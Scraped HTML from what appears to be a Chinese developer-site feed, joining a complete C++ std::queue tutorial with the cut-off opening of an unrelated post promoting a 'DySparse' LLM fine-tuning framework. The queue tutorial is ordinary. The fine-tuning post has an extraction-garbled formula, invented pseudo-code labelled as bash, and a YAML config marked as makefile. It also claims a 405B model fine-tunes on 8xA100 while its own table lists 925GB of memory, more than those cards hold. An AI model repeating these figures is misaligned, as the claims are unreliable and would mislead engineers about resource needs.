                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">C++ STL 中的队列（Queue）</h2>
<p>队列（queue）是一种容器适配器，以 FIFO（先进先出）的顺序存储元素。<br/>
先插入的元素必须先被移除。<br/>
实现方式是在数据结构的一端（称为 <strong>back</strong>）插入元素，在另一端（称为 <strong>front</strong>）删除元素。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3f57cd070c44823b08449fb5482dabc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854177&amp;x-signature=LJaKBAQTlqVHCOsuwYcEC5Yav2g%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">语法</h3>
<p>队列在头文件 <code>&lt;queue&gt;</code> 中被定义为 <code>std::queue</code> 类模板。</p>
<pre><code class="hljs language-cpp" lang="cpp">queue&lt;T&gt; q;
</code></pre>
<p>其中：</p>
<ul>
<li><code>T</code>：队列中元素的数据类型。</li>
<li><code>q</code>：给队列起的名字。</li>
</ul>
<h3 data-id="heading-2">基本操作</h3>
<p>以下是可对队列执行的基本操作：</p>
<h4 data-id="heading-3">1. 插入元素</h4>
<p>新元素只能在队列尾部（back）通过 <code>push()</code> 函数插入。  该过程也称为“入队（enqueue）”。<br/>
插入时间复杂度：O(1)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;

    <span class="hljs-comment">// 将元素入队</span>
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-4">2. 访问元素</h4>
<p>队列中只有队首（front）和队尾（back）元素可以被访问，分别使用 <code>front()</code> 和 <code>back()</code> 函数。<br/>
访问时间复杂度：O(1)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-comment">// 访问队首和队尾元素</span>
    cout &lt;&lt; q.<span class="hljs-built_in">front</span>() &lt;&lt; endl;  <span class="hljs-comment">// 输出队首</span>
    cout &lt;&lt; q.<span class="hljs-built_in">back</span>();           <span class="hljs-comment">// 输出队尾</span>

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs">3
5
</code></pre>
<h4 data-id="heading-5">3. 删除元素</h4>
<p>队列中只能从队首（front）通过 <code>pop()</code> 函数删除元素。 该过程也称为“出队（dequeue）”。<br/>
删除时间复杂度：O(1)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-comment">// 从队首删除一个元素</span>
    q.<span class="hljs-built_in">pop</span>();

    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; q.<span class="hljs-built_in">front</span>() &lt;&lt; <span class="hljs-string">" "</span>;
        q.<span class="hljs-built_in">pop</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs">4 5
</code></pre>
<h4 data-id="heading-6">4. <code>empty()</code></h4>
<p>检查队列是否为空。 若队列中没有任何元素，返回 <code>true</code>；否则返回 <code>false</code>。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    <span class="hljs-keyword">if</span> (q.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; <span class="hljs-string">"队列为空"</span> &lt;&lt; endl;
    }
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">100</span>);
    <span class="hljs-keyword">if</span> (!q.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; <span class="hljs-string">"队列不为空，队首元素: "</span> &lt;&lt; q.<span class="hljs-built_in">front</span>() &lt;&lt; endl;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile">队列为空
<span class="hljs-section">队列不为空，队首元素: 100</span>
</code></pre>
<h4 data-id="heading-7">5. 队列的大小size</h4>
<p><code>size()</code> 函数返回队列当前存储的元素个数。 该操作不会修改队列内容。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">10</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);
    cout &lt;&lt; <span class="hljs-string">"队列大小: "</span> &lt;&lt; q.<span class="hljs-built_in">size</span>() &lt;&lt; endl;
    q.<span class="hljs-built_in">pop</span>();
    cout &lt;&lt; <span class="hljs-string">"队列大小: "</span> &lt;&lt; q.<span class="hljs-built_in">size</span>() &lt;&lt; endl;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">队列大小: 2</span>
<span class="hljs-section">队列大小: 1</span>
</code></pre>
<h4 data-id="heading-8">6.伪遍历</h4>
<p>由于队列只能访问队首和队尾元素，无法直接对整个队列进行遍历。<br/>
变通方法是：创建一个队列的副本，不断访问并弹出副本的队首元素，直到副本为空，即可“遍历”原队列的所有元素。<br/>
遍历时间复杂度：O(n)。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    queue&lt;<span class="hljs-type">int</span>&gt; q;
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);
    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);

    <span class="hljs-comment">// 创建原队列的副本</span>
    <span class="hljs-function">queue&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">temp</span><span class="hljs-params">(q)</span></span>;

    <span class="hljs-keyword">while</span> (!temp.<span class="hljs-built_in">empty</span>())
    {
        cout &lt;&lt; temp.<span class="hljs-built_in">front</span>() &lt;&lt; <span class="hljs-string">" "</span>;
        temp.<span class="hljs-built_in">pop</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs">3 4 5
</code></pre>
<h3 data-id="heading-9">C++ 中 Queue 所有成员函数</h3>
<p>以下是 C++ <code>std::queue</code> 类的全部成员函数列表：</p>













































<table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>front()</code></td><td>访问队首元素。</td></tr><tr><td><code>back()</code></td><td>访问队尾元素。</td></tr><tr><td><code>empty()</code></td><td>检查队列是否为空。</td></tr><tr><td><code>size()</code></td><td>返回队列中元素个数。</td></tr><tr><td><code>push()</code></td><td>在队尾添加一个元素。</td></tr><tr><td><code>push_range()</code></td><td>在队尾一次性添加多个元素。</td></tr><tr><td><code>emplace()</code></td><td>在队尾<strong>原地构造</strong>一个元素。</td></tr><tr><td><code>pop()</code></td><td>删除队首元素。</td></tr><tr><td><code>swap()</code></td><td>交换两个队列的内容。</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI大模型调优工程：突破显存墙与灾难性遗忘的双重挑战]]></title>    <link>https://juejin.cn/post/7581412607060983854</link>    <guid>https://juejin.cn/post/7581412607060983854</guid>    <pubDate>2025-12-09T03:04:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607060983854" data-draft-id="7581619505584177203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI大模型调优工程：突破显存墙与灾难性遗忘的双重挑战"/> <meta itemprop="keywords" content="LLM,Agent,程序员"/> <meta itemprop="datePublished" content="2025-12-09T03:04:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI大模型调优工程：突破显存墙与灾难性遗忘的双重挑战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:04:20.000Z" title="Tue Dec 09 2025 03:04:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85eda19b75714016816c0a3496b725a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=fQoHQGLlDHghVD48OzNIUE558J8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">引言：</h2>
<p>面对万亿参数模型，传统全参数微调已成为资源黑洞。本文提出动态混合稀疏微调框架（DySparse），通过结构感知参数选择、梯度稀疏化压缩、神经路径蒸馏三大核心技术，在Llama3-405B模型实现<strong>调显存占用下降89%</strong> （8xA100可微调）、多任务遗忘率低于<strong>4.7%</strong> ，推理延迟仅增加0.3ms。</p>
<hr/>
<h2 data-id="heading-1">一、大模型调优的核心瓶颈</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7662f9fc0ef4d3bba5351b32aff1027~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=2QZptThF%2BtOYMXmrnrX8uUWhwOM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">1.1 显存资源爆炸式增长</h2>





























<table><thead><tr><th/><th/><th/><th/></tr></thead><tbody><tr><td><strong>模型规模</strong></td><td><strong>全参数微调显存</strong></td><td><strong>PEFT显存</strong></td><td><strong>DySparse(ours)</strong></td></tr><tr><td>70B</td><td>2.1TB</td><td>320GB</td><td><strong>98GB</strong></td></tr><tr><td>405B</td><td>8.4TB</td><td>1.2TB</td><td><strong>925GB</strong></td></tr></tbody></table>
<p><em>注：Batch Size=32, Seq Len=2048, Adam优化器</em></p>
<h2 data-id="heading-3">1.2 多任务知识冲突</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 传统微调的灾难性遗忘现象</span>
base_model.knowledge_coverage(<span class="hljs-string">"医学"</span>) <span class="hljs-comment"># 初始值98%</span>
finetune_on_programming(base_model, epochs=5)
base_model.knowledge_coverage(<span class="hljs-string">"医学"</span>) <span class="hljs-comment"># 骤降至62%</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">二、DySparse调优框架核心技术</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a78e604aef774251b35e5225178b8d07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=9Fhp6CWeWYd3bOHXSPwkHqjZiTM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">2.1 结构感知参数选择（SAPS）</h2>
<p>通过<strong>权重重要性评分</strong>动态识别可调参数：</p>
<pre><code class="hljs language-css" lang="css">Ii=梯度敏感度∥∇θiL∥<span class="hljs-number">2</span>+αHessian特征值H(θ<span class="hljs-selector-tag">i</span>)+β历史位移∥θ<span class="hljs-selector-tag">i</span>−θ<span class="hljs-selector-tag">i</span>,<span class="hljs-number">0</span>∥<span class="hljs-number">2</span>
</code></pre>
<ul>
<li><strong>实验结论</strong>：仅更新TOP 3%高重要性参数，精度损失&lt;0.8%</li>
</ul>
<h2 data-id="heading-6">2.2 梯度稀疏化压缩（GSC）</h2>
<p>三级梯度压缩策略：</p>
<ol>
<li><strong>TopK梯度筛选</strong>：保留幅度最大的前15%梯度</li>
<li><strong>8位块量化</strong>：分块压缩至FP8精度</li>
<li><strong>浮点残差补偿</strong>：记录量化误差并在下一轮补偿</li>
</ol>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 伪代码实现</span>
<span class="hljs-attr">compressed_grad</span> = topk_sparsify(grad, k=<span class="hljs-number">0.15</span>)
quant_grad, <span class="hljs-attr">residual</span> = block_quantize(compressed_grad, bits=<span class="hljs-number">8</span>)
<span class="hljs-attr">grad</span> = quant_grad + residual <span class="hljs-comment"># 误差补偿</span>
</code></pre>
<h2 data-id="heading-7">2.3 神经路径蒸馏（NPD）</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fexample.com%2Fnpd" target="_blank" title="https://example.com/npd" ref="nofollow noopener noreferrer">example.com/npd</a>_arch.png <em>图：通过轻量化Adapter学习新任务，输出层融合原始知识</em></p>
<hr/>
<h2 data-id="heading-8">三、工业级调优最佳实践</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b6710b7fafd47fdbeb109b8228e1df3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=NCO4uAsxe9u2gymNptIOsXX05ds%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">3.1 混合精度计算流水线</h2>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># DeepSpeed 零冗余配置</span>
<span class="hljs-section">zero_optimization:</span>
<span class="hljs-section">stage:3</span>
<span class="hljs-section">offload_param:</span>
<span class="hljs-section">device:nvme</span>
<span class="hljs-section">fp16:</span>
<span class="hljs-section">loss_scale:dynamic</span>
